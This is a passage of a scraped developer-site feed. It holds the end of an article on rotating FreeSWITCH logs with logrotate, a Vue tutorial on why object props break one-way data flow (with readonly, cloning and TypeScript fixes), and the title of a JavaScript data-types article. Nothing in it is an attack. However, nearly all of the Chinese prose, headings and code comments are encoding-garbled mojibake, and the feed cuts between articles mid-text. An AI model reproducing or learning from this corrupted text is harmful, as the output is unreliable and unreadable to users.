<pre><code class="hljs language-bash" lang="bash">/data/freeswitch/log/freeswitch-*.<span class="hljs-built_in">log</span> {
    daily
    rotate 30
    compress
    delaycompress
    missingok
    notifempty
}
</code></pre>
<blockquote>
<p>/data/freeswitch/log/ æ˜¯fsçš„æ—¥å¿—è·¯å¾„ï¼Œå¯ä»¥è‡ªè¡Œæ›´æ”¹</p>
</blockquote>
<p>mod_logfile ç»“åˆ å®šæ—¶ä»»åŠ¡ï¼Œç»“åˆ logrotate å°±å¯ä»¥ç®¡ç†æ—¥å¿—</p>
<p>ä½†æ˜¯è¿™ä¸ªæœ‰æ²¡æœ‰å¤ªéº»çƒ¦ï¼Œå…¶å® logrotate æœ¬èº«å°±å¯ä»¥ ç®¡ç†fsæ—¥å¿—ï¼Œä¸‹é¢ç»™å‡ºæˆ‘æœ¬åœ°çš„ logrotate fsæ—¥å¿—é…ç½®</p>
<pre><code class="hljs language-log" lang="log"># FreeSWITCH ä¸»æ—¥å¿—
/home/fs/docker/logs/freeswitch.log {
    daily
    # ä¿ç•™ 7 å¤©
    rotate 7          
    missingok
    notifempty
    compress
    delaycompress
    create 0640 root root
    
    # å…³é”®ï¼šç”¨æ—¥æœŸåšåç¼€
    dateext        
    # æ–‡ä»¶åæ ¼å¼ï¼š-2026-01-08
    dateformat -%Y-%m-%d  
    # ä¿è¯åç¼€æ˜¯ .logï¼Œå¦åˆ™ä¼šè¢«æˆªæ–­
    extension .log   
    
    sharedscripts
    postrotate
        /usr/bin/pkill -SIGUSR1 freeswitch
    endscript
}

# FreeSWITCH HTTP æ¨¡å—æ—¥å¿—
/home/fs/docker/logs/freeswitch_http.log {
    daily
    rotate 7
    missingok
    notifempty
    compress
    delaycompress
    create 0640 root root
    
    # å…³é”®ï¼šç”¨æ—¥æœŸåšåç¼€
    dateext        
    # æ–‡ä»¶åæ ¼å¼ï¼š-2026-01-08
    dateformat -%Y-%m-%d  
    # ä¿è¯åç¼€æ˜¯ .logï¼Œå¦åˆ™ä¼šè¢«æˆªæ–­
    extension .log   
    
    sharedscripts
    postrotate
        /usr/bin/pkill -SIGUSR1 freeswitch
    endscript
}
</code></pre>
<p>å…¶ä¸­éœ€è¦æ³¨æ„ï¼Œéœ€è¦ æŠŠ mod_logfile å…³é—­, ä¸ä¼šä¼šæœ‰ç©ºæ—¥å¿—æ–‡ä»¶</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"rotate-on-hup"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"false"</span>/&gt;</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[VueçœŸçš„æ˜¯å•å‘æ•°æ®æµï¼Ÿ]]></title>    <link>https://juejin.cn/post/7592683699772604426</link>    <guid>https://juejin.cn/post/7592683699772604426</guid>    <pubDate>2026-01-08T08:32:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592683699772604426" data-draft-id="7592765004807438387" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="VueçœŸçš„æ˜¯å•å‘æ•°æ®æµï¼Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯,Vue.js"/> <meta itemprop="datePublished" content="2026-01-08T08:32:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ»¡å¤©æ˜Ÿè¾°"/> <meta itemprop="url" content="https://juejin.cn/user/2771198801097485"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            VueçœŸçš„æ˜¯å•å‘æ•°æ®æµï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2771198801097485/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ»¡å¤©æ˜Ÿè¾°
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T08:32:39.000Z" title="Thu Jan 08 2026 08:32:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Vue å•å‘æ•°æ®æµçš„æ·±å…¥è§£æï¼šå¯¹è±¡ Props çš„é™·é˜±</h2>
<h3 data-id="heading-1">ğŸ”Â <strong>æ ¸å¿ƒé—®é¢˜ï¼šå¯¹è±¡ Props çš„å¯å˜æ€§</strong></h3>
<p>ä½ æŒ‡å‡ºçš„å®Œå…¨æ­£ç¡®ï¼<strong>è¿™æ˜¯ Vue å•å‘æ•°æ®æµä¸­æœ€å¤§çš„é™·é˜±</strong>ã€‚</p>
<h3 data-id="heading-2">ğŸš¨Â <strong>é—®é¢˜çš„æœ¬è´¨</strong></h3>
<h4 data-id="heading-3">1.Â <strong>å¯¹è±¡/æ•°ç»„ Props çš„å¼•ç”¨ä¼ é€’</strong></h4>
<pre><code class="hljs language-vue" lang="vue">&lt;!-- çˆ¶ç»„ä»¶ --&gt;
&lt;script setup&gt;
import { reactive } from 'vue'
import ChildComponent from './ChildComponent.vue'

// çˆ¶ç»„ä»¶çš„å“åº”å¼å¯¹è±¡
const user = reactive({
  name: 'å¼ ä¸‰',
  age: 25,
  address: {
    city: 'åŒ—äº¬',
    street: 'é•¿å®‰è¡—'
  }
})
&lt;/script&gt;

&lt;template&gt;
  &lt;!-- ä¼ é€’å¯¹è±¡ prop --&gt;
  &lt;ChildComponent :user="user" /&gt;
&lt;/template&gt;

&lt;!-- å­ç»„ä»¶ ChildComponent.vue --&gt;
&lt;script setup&gt;
const props = defineProps(['user'])

// âš ï¸ å±é™©æ“ä½œï¼šå¯ä»¥ç›´æ¥ä¿®æ”¹çˆ¶ç»„ä»¶çš„æ•°æ®ï¼
const updateUser = () =&gt; {
  props.user.name = 'æå››'  // âœ… ç”Ÿæ•ˆï¼Œä¸”ä¿®æ”¹äº†çˆ¶ç»„ä»¶
  props.user.age++         // âœ… ç”Ÿæ•ˆ
  props.user.address.city = 'ä¸Šæµ·'  // âœ… ç”Ÿæ•ˆ
  props.user.address.street = 'å—äº¬è·¯'  // âœ… ç”Ÿæ•ˆ
}

// ç”šè‡³å¯ä»¥ç›´æ¥æ·»åŠ æ–°å±æ€§
const addProperty = () =&gt; {
  props.user.email = 'new@email.com'  // âœ… ä¼šæ·»åŠ åˆ°çˆ¶ç»„ä»¶å¯¹è±¡
}
&lt;/script&gt;
</code></pre>
<h3 data-id="heading-4">ğŸ“ŠÂ <strong>ä¸ºä»€ä¹ˆä¼šå‡ºç°è¿™ä¸ªé—®é¢˜ï¼Ÿ</strong></h3>
<h4 data-id="heading-5">2.Â <strong>JavaScript å¼•ç”¨æœºåˆ¶ + Vue å“åº”å¼ç³»ç»Ÿ</strong></h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. JavaScript å¯¹è±¡æ˜¯å¼•ç”¨ä¼ é€’</span>
<span class="hljs-keyword">const</span> parentObj = { <span class="hljs-attr">name</span>: <span class="hljs-string">'Parent'</span> }
<span class="hljs-keyword">const</span> childProp = parentObj  <span class="hljs-comment">// åŒä¸€ä¸ªå¼•ç”¨ï¼</span>

childProp.<span class="hljs-property">name</span> = <span class="hljs-string">'Modified'</span>  <span class="hljs-comment">// ä¿®æ”¹äº† parentObj</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(parentObj.<span class="hljs-property">name</span>)  <span class="hljs-comment">// 'Modified'</span>

<span class="hljs-comment">// 2. Vue çš„å“åº”å¼ç³»ç»ŸåŸºäº Proxy</span>
<span class="hljs-keyword">const</span> reactiveParent = <span class="hljs-title function_">reactive</span>({ <span class="hljs-attr">data</span>: <span class="hljs-string">'original'</span> })
<span class="hljs-comment">// å­ç»„ä»¶è·å¾—çš„æ˜¯åŒä¸€ä¸ª Proxy å¯¹è±¡</span>

<span class="hljs-comment">// 3. Vue çš„å¼€å‘æ¨¡å¼è­¦å‘Šæœ‰é™åˆ¶</span>
<span class="hljs-comment">// ç›´æ¥èµ‹å€¼ props.user = {} âŒ ä¼šè­¦å‘Š</span>
<span class="hljs-comment">// ä½†ä¿®æ”¹å±æ€§ props.user.name = 'new' âš ï¸ ä¸ä¼šè­¦å‘Šï¼</span>
</code></pre>
<h3 data-id="heading-6">ğŸ”„Â <strong>Vue å®˜æ–¹æ€åº¦</strong></h3>
<h4 data-id="heading-7">3.Â <strong>æ–‡æ¡£ä¸­çš„è¯´æ˜</strong></h4>
<pre><code class="hljs language-markdo" lang="markdo">Vue å®˜æ–¹æ–‡æ¡£æ˜ç¡®æŒ‡å‡ºï¼š

"æ³¨æ„åœ¨ JavaScript ä¸­å¯¹è±¡å’Œæ•°ç»„æ˜¯é€šè¿‡å¼•ç”¨ä¼ å…¥çš„ï¼Œ
æ‰€ä»¥å¯¹äºä¸€ä¸ªæ•°ç»„æˆ–å¯¹è±¡ç±»å‹çš„ prop æ¥è¯´ï¼Œ
åœ¨å­ç»„ä»¶ä¸­æ”¹å˜å˜æ›´è¿™ä¸ªå¯¹è±¡æˆ–æ•°ç»„æœ¬èº«å°†ä¼šå½±å“åˆ°çˆ¶ç»„ä»¶çš„çŠ¶æ€ã€‚"

"è¿™åœ¨ Vue ä¸­æ˜¯ä¸è¢«æ¨èçš„ï¼Œå› ä¸ºå®ƒç ´åäº†å•å‘æ•°æ®æµçš„æ¸…æ™°æ€§ã€‚"
</code></pre>
<h4 data-id="heading-8">4.Â <strong>è­¦å‘Šæœºåˆ¶çš„å±€é™</strong></h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Vue åªèƒ½æ£€æµ‹åˆ°è¿™äº›æƒ…å†µï¼š</span>

<span class="hljs-comment">// æƒ…å†µ1ï¼šç›´æ¥é‡æ–°èµ‹å€¼ âŒ ä¼šè­¦å‘Š</span>
props.<span class="hljs-property">user</span> = { <span class="hljs-attr">name</span>: <span class="hljs-string">'new'</span> }
<span class="hljs-comment">// è­¦å‘Š: Attempting to mutate prop "user"</span>

<span class="hljs-comment">// æƒ…å†µ2ï¼šä¿®æ”¹åŸºæœ¬ç±»å‹ prop âŒ ä¼šè­¦å‘Š</span>
props.<span class="hljs-property">count</span> = <span class="hljs-number">2</span>
<span class="hljs-comment">// è­¦å‘Š: Attempting to mutate prop "count"</span>

<span class="hljs-comment">// æƒ…å†µ3ï¼šä¿®æ”¹å¯¹è±¡/æ•°ç»„çš„å±æ€§ âš ï¸ ä¸ä¼šè­¦å‘Šï¼</span>
props.<span class="hljs-property">user</span>.<span class="hljs-property">name</span> = <span class="hljs-string">'new'</span>
props.<span class="hljs-property">list</span>.<span class="hljs-title function_">push</span>(<span class="hljs-string">'item'</span>)
<span class="hljs-comment">// æ— è­¦å‘Šï¼Œä½†ç ´åäº†å•å‘æ•°æ®æµ</span>
</code></pre>
<h3 data-id="heading-9">ğŸ›¡ï¸Â <strong>å¦‚ä½•é¿å…è¿™ä¸ªé—®é¢˜ï¼Ÿ</strong></h3>
<h4 data-id="heading-10">5.Â <strong>è§£å†³æ–¹æ¡ˆ1ï¼šä¼ é€’è§£æ„åçš„å€¼</strong></h4>
<pre><code class="hljs language-vue" lang="vue">&lt;!-- çˆ¶ç»„ä»¶ --&gt;
&lt;template&gt;
  &lt;!-- ä¼ é€’åŸºæœ¬ç±»å‹æˆ–æ·±åº¦è§£æ„ --&gt;
  &lt;ChildComponent 
    :user-name="user.name"
    :user-age="user.age"
    :user-city="user.address.city"
  /&gt;
  
  &lt;!-- æˆ–è€…ä½¿ç”¨ computed åˆ›å»ºåªè¯»å‰¯æœ¬ --&gt;
  &lt;ChildComponent :user="readonlyUser" /&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { computed } from 'vue'

const user = reactive({ name: 'å¼ ä¸‰', age: 25 })

// åˆ›å»ºåªè¯»ç‰ˆæœ¬
const readonlyUser = computed(() =&gt; ({
  name: user.name,
  age: user.age
}))
&lt;/script&gt;
</code></pre>
<h4 data-id="heading-11">6.Â <strong>è§£å†³æ–¹æ¡ˆ2ï¼šä½¿ç”¨æ·±åº¦åªè¯»</strong></h4>
<pre><code class="hljs language-vue" lang="vue">&lt;!-- çˆ¶ç»„ä»¶ --&gt;
&lt;script setup&gt;
import { readonly } from 'vue'

const user = reactive({ name: 'å¼ ä¸‰', age: 25 })

// ä½¿ç”¨ readonly åŒ…è£…
const readonlyUser = readonly(user)
&lt;/script&gt;

&lt;template&gt;
  &lt;ChildComponent :user="readonlyUser" /&gt;
&lt;/template&gt;

&lt;!-- å­ç»„ä»¶ --&gt;
&lt;script setup&gt;
const props = defineProps(['user'])

const updateUser = () =&gt; {
  // âŒ ç°åœ¨ä¼šè§¦å‘è­¦å‘Š
  props.user.name = 'æå››'
  // è­¦å‘Š: Set operation on key "name" failed: target is readonly.
}
&lt;/script&gt;
</code></pre>
<h4 data-id="heading-12">7.Â <strong>è§£å†³æ–¹æ¡ˆ3ï¼šä½¿ç”¨æ·±åº¦å¤åˆ¶</strong></h4>
<pre><code class="hljs language-vue" lang="vue">&lt;!-- å­ç»„ä»¶å¤„ç† --&gt;
&lt;script setup&gt;
import { ref, watch } from 'vue'

const props = defineProps(['user'])

// æ·±åº¦å¤åˆ¶åˆ°æœ¬åœ°çŠ¶æ€
const localUser = ref(JSON.parse(JSON.stringify(props.user)))

// æˆ–è€…ä½¿ç”¨ lodash çš„ cloneDeep
import { cloneDeep } from 'lodash-es'
const localUser = ref(cloneDeep(props.user))

// ç›‘å¬ props å˜åŒ–åŒæ­¥æ›´æ–°
watch(() =&gt; props.user, (newUser) =&gt; {
  localUser.value = cloneDeep(newUser)
}, { deep: true })
&lt;/script&gt;
</code></pre>
<h3 data-id="heading-13">ğŸ“ˆÂ <strong>æœ€ä½³å®è·µæ¨¡å¼</strong></h3>
<h4 data-id="heading-14">8.Â <strong>å·¥å‚å‡½æ•°æ¨¡å¼</strong></h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// composables/useSafeProps.js</span>
<span class="hljs-keyword">import</span> { ref, watch, toRaw } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useSafeProp</span>(<span class="hljs-params">propValue, options = {}</span>) {
  <span class="hljs-keyword">const</span> { deep = <span class="hljs-literal">true</span>, immediate = <span class="hljs-literal">true</span> } = options
  
  <span class="hljs-comment">// åˆ›å»ºæœ¬åœ°å‰¯æœ¬</span>
  <span class="hljs-keyword">const</span> localValue = <span class="hljs-title function_">ref</span>(<span class="hljs-title function_">structuredClone</span>(<span class="hljs-title function_">toRaw</span>(propValue)))
  
  <span class="hljs-comment">// ç›‘å¬ props å˜åŒ–</span>
  <span class="hljs-title function_">watch</span>(<span class="hljs-function">() =&gt;</span> propValue, <span class="hljs-function">(<span class="hljs-params">newValue</span>) =&gt;</span> {
    localValue.<span class="hljs-property">value</span> = <span class="hljs-title function_">structuredClone</span>(<span class="hljs-title function_">toRaw</span>(newValue))
  }, { deep, immediate })
  
  <span class="hljs-keyword">return</span> localValue
}

<span class="hljs-comment">// åœ¨ç»„ä»¶ä¸­ä½¿ç”¨</span>
<span class="hljs-keyword">const</span> props = <span class="hljs-title function_">defineProps</span>([<span class="hljs-string">'user'</span>, <span class="hljs-string">'list'</span>])
<span class="hljs-keyword">const</span> localUser = <span class="hljs-title function_">useSafeProp</span>(props.<span class="hljs-property">user</span>)
<span class="hljs-keyword">const</span> localList = <span class="hljs-title function_">useSafeProp</span>(props.<span class="hljs-property">list</span>)
</code></pre>
<h4 data-id="heading-15">9.Â <strong>ç±»å‹å®‰å…¨çš„æ·±åº¦åªè¯»</strong></h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// types/utilities.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">DeepReadonly</span>&lt;T&gt; = {
  <span class="hljs-keyword">readonly</span> [P <span class="hljs-keyword">in</span> keyof T]: T[P] <span class="hljs-keyword">extends</span> <span class="hljs-built_in">object</span> 
    ? T[P] <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Function</span> 
      ? T[P] 
      : <span class="hljs-title class_">DeepReadonly</span>&lt;T[P]&gt;
    : T[P]
}

<span class="hljs-comment">// çˆ¶ç»„ä»¶ä½¿ç”¨</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">DeepReadonly</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/types/utilities'</span>

<span class="hljs-keyword">const</span> user = <span class="hljs-title function_">reactive</span>({ 
  <span class="hljs-attr">name</span>: <span class="hljs-string">'å¼ ä¸‰'</span>, 
  <span class="hljs-attr">profile</span>: { <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>, <span class="hljs-attr">address</span>: { <span class="hljs-attr">city</span>: <span class="hljs-string">'åŒ—äº¬'</span> } } 
})

<span class="hljs-keyword">const</span> readonlyUser = user <span class="hljs-keyword">as</span> <span class="hljs-title class_">DeepReadonly</span>&lt;<span class="hljs-keyword">typeof</span> user&gt;

<span class="hljs-comment">// ä¼ é€’ç»™å­ç»„ä»¶</span>
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ChildComponent</span> <span class="hljs-attr">:user</span>=<span class="hljs-string">"readonlyUser"</span> /&gt;</span></span>

<span class="hljs-comment">// å­ç»„ä»¶ä¸­ TypeScript ä¼šé˜»æ­¢ä¿®æ”¹</span>
props.<span class="hljs-property">user</span>.<span class="hljs-property">name</span> = <span class="hljs-string">'new'</span>  <span class="hljs-comment">// âŒ TypeScript é”™è¯¯</span>
props.<span class="hljs-property">user</span>.<span class="hljs-property">profile</span>.<span class="hljs-property">age</span> = <span class="hljs-number">30</span>  <span class="hljs-comment">// âŒ TypeScript é”™è¯¯</span>
</code></pre>
<h3 data-id="heading-16">ğŸ¯Â <strong>ç»“è®ºï¼šVue çœŸçš„æ˜¯å•å‘æ•°æ®æµå—ï¼Ÿ</strong></h3>
<h4 data-id="heading-17"><strong>æ­£ç¡®ç­”æ¡ˆ</strong>ï¼š</h4>
<ol>
<li><strong>è®¾è®¡ç†å¿µä¸Š</strong>ï¼šVue è®¾è®¡ä¸ºå•å‘æ•°æ®æµ âœ…</li>
<li><strong>è¯­æ³•å±‚é¢</strong>ï¼šé€šè¿‡ props + events å¼ºåˆ¶æ‰§è¡Œå•å‘æµ âœ…</li>
<li><strong>å®ç°å±‚é¢</strong>ï¼šç”±äº JavaScript é™åˆ¶ï¼Œå­˜åœ¨å¯¹è±¡å¼•ç”¨æ¼æ´ âš ï¸</li>
<li><strong>å®è·µå±‚é¢</strong>ï¼šéœ€è¦å¼€å‘è€…è‡ªè§‰éµå®ˆè§„èŒƒ âš ï¸</li>
</ol>
<h4 data-id="heading-18"><strong>å…³é”®è®¤çŸ¥</strong>ï¼š</h4>
<ul>
<li><strong>Vue çš„å•å‘æ•°æ®æµæ˜¯"çº¦å®šå¤§äºå¼ºåˆ¶"</strong></li>
<li><strong>æ¡†æ¶æä¾›äº†åŸºç¡€ï¼Œä½†å¼€å‘è€…éœ€è¦è´Ÿè´£å…·ä½“å®ç°</strong></li>
<li><strong>å¯¹è±¡/æ•°ç»„ props çš„æ˜“å˜æ€§æ˜¯å·²çŸ¥çš„è®¾è®¡å–èˆ</strong></li>
<li><strong>é€šè¿‡å·¥å…·ã€è§„èŒƒå’Œæœ€ä½³å®è·µå¯ä»¥é¿å…é—®é¢˜</strong></li>
</ul>
<h4 data-id="heading-19"><strong>æœ€ç»ˆå»ºè®®</strong>ï¼š</h4>
<p>å¦‚æœä½ æƒ³ä¿æŒä¸¥æ ¼å•å‘æ•°æ®æµï¼š</p>
<ol>
<li>å§‹ç»ˆä½¿ç”¨ <code>readonly()</code> åŒ…è£…å¯¹è±¡ props</li>
<li>ä½¿ç”¨ TypeScript çš„åªè¯»ç±»å‹</li>
<li>é…ç½® ESLint ä¸¥æ ¼è§„åˆ™</li>
<li>é€šè¿‡äº‹ä»¶é€šä¿¡ï¼Œè€Œä¸æ˜¯ç›´æ¥ä¿®æ”¹</li>
<li>å¯¹äºå¤æ‚å¯¹è±¡ï¼Œä¼ é€’è§£æ„åçš„åŸºæœ¬ç±»å‹
ä½†ä¹Ÿè¦ç†è§£ Vue çš„è®¾è®¡å“²å­¦ï¼š"ç»™å¼€å‘è€…é€‰æ‹©æƒï¼Œè€Œä¸æ˜¯å¼ºåˆ¶çº¦æŸ"</li>
</ol>
<p><strong>Vue çš„è®¾è®¡å“²å­¦æ˜¯"æ¸è¿›å¼"å’Œ"çµæ´»"</strong> ï¼Œå®ƒæä¾›äº†å•å‘æ•°æ®æµçš„åŸºç¡€ï¼Œä½†ä¹Ÿå…è®¸åœ¨éœ€è¦æ—¶ç»•è¿‡é™åˆ¶ã€‚è¿™æ—¢æ˜¯ä¼˜ç‚¹ï¼ˆçµæ´»æ€§ï¼‰ï¼Œä¹Ÿæ˜¯æŒ‘æˆ˜ï¼ˆéœ€è¦å›¢é˜Ÿè§„èŒƒï¼‰ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScriptæœ‰å“ªäº›æ•°æ®ç±»å‹ï¼Ÿå¦‚ä½•åˆ¤æ–­ä¸€ä¸ªå˜é‡çš„æ•°æ®ç±»å‹ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7592759140037853225</link>    <guid>https://juejin.cn/post/7592759140037853225</guid>    <pubDate>2026-01-08T08:33:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592759140037853225" data-draft-id="7592637149696753699" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScriptæœ‰å“ªäº›æ•°æ®ç±»å‹ï¼Ÿå¦‚ä½•åˆ¤æ–­ä¸€ä¸ªå˜é‡çš„æ•°æ®ç±»å‹ï¼Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2026-01-08T08:33:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç é€”æ½‡æ½‡"/> <meta itemprop="url" content="https://juejin.cn/user/2386391857112611"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScriptæœ‰å“ªäº›æ•°æ®ç±»å‹ï¼Ÿå¦‚ä½•åˆ¤æ–­ä¸€ä¸ªå˜é‡çš„æ•°æ®ç±»å‹ï¼Ÿ
